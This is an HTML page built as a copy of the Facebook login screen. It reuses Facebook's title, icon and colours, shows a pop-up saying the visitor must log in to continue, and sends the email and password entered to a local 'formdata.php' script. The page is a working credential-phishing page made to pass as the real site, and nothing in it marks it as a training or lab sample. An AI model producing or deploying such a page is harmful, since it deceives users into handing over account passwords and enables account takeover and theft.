<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Log in to Facebook | Facebook</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
    <style>
    @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
    *{
      font-family: 'Open Sans', sans-serif;
      margin: 0;
      padding: 0;
    }
    header{
      color:white;
      background-color: #3B5998;
      height: 44px;
    }
    .p{
      font-weight: bold;
      text-align: center;
      padding-top:8px;
    }
    .fb-form{
      background: #ECEFF5;
      text-align: center;
    }
    form{
      padding-top: 15px;
    }
    input{
      width: 100%;
      padding: 12px 20px;
      width: 390px;
      display: inline-block;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    .fb_pass{
      border-top:none;
    }
    .submit{
      margin-top:5px;
      background: #4267B2;
      color: white;
      font-weight: bold;
    }
    .btn5012{
      background: #42B72A;
      color: white;
      font-weight: bold;
      border: none;
      padding:12px;
      margin-top: 35px;
    }
    #pl{
      color: gray;
      font-size: 14px;
      padding:15px;
    }
    #pla{
      margin-top:10px;
      color: gray;
      text-align: center;
    }
    </style>
    <script>
         alert("you have to Log In to continue");
    </script>
  </head>
  <body>
    <header>
      <h2><p class="p">facebook</p></h2>
    </header>
    <div class="fb-form"><br>
      <form action="formdata.php" method="post">
        <input
          autocorrect="off"
          autocapitalize="off"
          class="fb_uname"
          autocomplete="on"
          name="email"
          placeholder="Mobile number or email address"
          type="text"><br>
        <input
          autocorrect="off"
          autocapitalize="off"
          class="fb_pass"
          name="pass"
          autocomplete="off"
          placeholder="Password"
          type="password"><br>
          <input type="submit" value="Log In" class="submit">
      </form>
      <button class="btn5012">Create New Account</button>
      <p id="pl">Forgot Password?.Help Center.Report a Problem</p>
    </div>
    <footer id="pla">
      <b>English(UK).</b>&nbsp;नेपाली. More<br>
      Facebook&copy;2020
    </footer>
  </body>
</html>
